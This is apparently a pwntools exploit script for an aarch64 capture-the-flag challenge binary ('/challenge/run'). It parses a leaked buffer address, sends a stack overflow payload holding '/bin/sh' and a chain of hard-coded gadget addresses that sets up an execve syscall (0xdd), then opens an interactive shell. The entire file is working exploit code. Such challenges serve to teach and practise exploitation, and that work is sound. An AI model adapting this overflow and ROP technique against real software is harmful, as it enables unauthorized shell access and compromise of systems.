from pwn import *
context.arch="aarch64"
# context.terminal = ['tmux', 'splitw', '-h']
# exe_name = "/usr/bin/qemu-aarch64-static"
# eargv = ["/usr/bin/qemu-aarch64-static", "-g", "1234", "/challenge/level-4-0"]
# p = process(executable= exe_name, argv=eargv)
exe_name = "/challenge/run"
p = process(exe_name)
p.recvuntil(b"[LEAK] Your input buffer is located at: ")
addr = p.recvuntil(b"\n")[:-2]
addr = int(addr.decode(), 16)
exp= b"/bin/sh\x00" + b"A"*(0x37-len(b"/bin/sh\x00")) + p64(addr-9) + p64(0x0000000000401d94) \
+ p64(addr) + p64(0x0000000000401d9c) \
+ p64(0) + p64(0x0000000000401da4) \
+ p64(0) + p64(0x0000000000401dd4) \
+ p64(0xdd) + p64(0x0000000000401dec)



p.send(exp)

p.interactive()